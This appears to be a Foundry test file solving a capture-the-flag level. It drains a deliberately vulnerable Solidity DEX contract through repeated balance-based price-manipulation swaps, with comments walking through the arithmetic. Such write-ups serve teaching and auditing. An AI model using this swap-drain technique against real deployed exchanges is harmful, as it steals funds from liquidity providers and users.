// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Dex.sol";
import "src/levels/DexFactory.sol";

contract TestDex is BaseTest {
    Dex private level;
    ERC20 token1;
    ERC20 token2;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new DexFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance{value: 1 ether}(true));
        level = Dex(levelAddress);

        token1 = ERC20(level.token1());
        token2 = ERC20(level.token2());

        // Check that the contract is correctly setup
        assertEq(token1.balanceOf(address(level)) == 100 && token2.balanceOf(address(level)) == 100, true);
        assertEq(token1.balanceOf(player) == 10 && token2.balanceOf(player) == 10, true);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);

        level.approve(address(level), 2**256 - 1);

        // Dex contract is calculating amount out based on the balance of each token.

        // Using the balance as a factor to calculate the price makes your contract keen to an attack
        // called “price manipulation”.

        // So lower is the balance of `tokenIn` (compared to the balance of `tokenOut`) (token you are selling),
        // higher is the amount of `tokenOut`.

        // We can drain the funds simply by swapping back and forth.

        // Originally we were given 10A and 10B and the dex has 100A and 100B where A and B represents token 1 and 2 respectively.
        // This gives us a price of 1A = 1B.

        // If we swap all of our A to B, our new balance is 0A and 20B. The dex has 110A and 90B.
        // Now if we were to swap all our B back to A, the dex is actually quoting us a better price than what we
        // originally swapped at (1:1). Our new balance is 24A (we should get 24.44 but due to solidity rounds
        // down all integer divisions to the nearest integer) and 0B while the dex has 86A and 110B.
        // Repeat this a few more times by swapping your entire balance and you'll be able to drain the funds of the dex.

        level.swap(level.token1(), level.token2(), 10);
        level.swap(level.token2(), level.token1(), 20);
        level.swap(level.token1(), level.token2(), 24);
        level.swap(level.token2(), level.token1(), 30);
        level.swap(level.token1(), level.token2(), 41);

        // After all these swaps the current situation is like this
        // Player Balance of token1 -> 0
        // Player Balance of token2 -> 65
        // Dex Balance of token1 -> 110
        // Dex Balance of token2 -> 45

        // The reason why we are swapping 45 token2 instead of the entire balance of token2 that we have (65) is
        // because the dex doesn't have enough token1 to give back to us.

        // So we need to calculate the right amount of token2 to sell in order to get back 110 token1

        // 110 token1 = amountOfToken2ToSell * DexBalanceOfToken1 / DexBalanceOfToken2
        // 110 = amountOfToken2ToSell * 110 / 45
        // amountOfToken2ToSell = 45

        level.swap(level.token2(), level.token1(), 45);

        vm.stopPrank();

        assertEq(token1.balanceOf(address(level)) == 0 || token2.balanceOf(address(level)) == 0, true);
    }
}
